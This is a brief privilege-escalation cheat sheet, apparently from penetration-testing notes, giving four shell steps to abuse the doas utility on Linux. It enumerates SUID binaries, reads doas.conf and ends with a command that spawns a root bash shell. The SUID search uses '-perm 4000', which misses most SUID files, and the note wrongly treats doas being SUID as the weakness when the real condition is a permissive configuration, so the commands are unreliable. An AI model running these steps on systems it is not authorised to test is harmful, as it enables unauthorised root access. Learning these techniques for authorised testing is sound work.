# Doas SUID privilege escalation

## Requirements: doas has SUID bit set

### Doas has similar functionality as sudo, which means you can run binaries with elevated privileges by using doas

## STEPS

 - find / -type f -perm 4000 2>/dev/null (Check for unusual SUID binaries)

 - find / -type f -name "doas.conf" 2>/dev/null (Search for the doas configuration file)

 - cat /path/to/doas.conf (Check which binary can be run using doas with elevated privileges)

 - doas -u root /usr/bin/bash -p (Runs bash using doas as root)
